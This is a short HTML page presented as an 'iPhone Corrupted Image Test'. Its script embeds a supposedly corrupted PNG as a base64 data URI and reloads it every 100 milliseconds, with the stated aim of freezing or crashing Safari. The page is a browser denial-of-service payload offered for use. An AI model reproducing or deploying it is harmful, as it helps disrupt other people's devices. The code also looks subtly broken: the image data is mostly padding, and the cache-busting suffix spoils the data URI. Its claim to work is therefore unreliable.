<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Corrupted Image Crash Test</title>
</head>
<body>
  <h1>iPhone Corrupted Image Test</h1>
  <p>If Safari freezes or crashes, the image payload worked.</p>

  <script>
    // Base64 of a corrupted PNG file
    let corruptedImage = 
      "data:image/png;base64," +
      "iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAYAAACfF/" +
      "kBAAAABmJLR0QA/wD/AP+gvaeTAAAF3ElEQVR4nO3d" +
      "QQ0AAAgDINc/9K3hBwwAAAAAAAAAAAAAAAAAAAAAAAA" +
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    // Add image to page
    let img = new Image();
    img.src = corruptedImage;
    document.body.appendChild(img);

    // Force multiple reloads of the image to stress Safari's rendering
    setInterval(() => {
      img.src = corruptedImage + "?cache=" + Math.random();
    }, 100);
  </script>
</body>
</html>
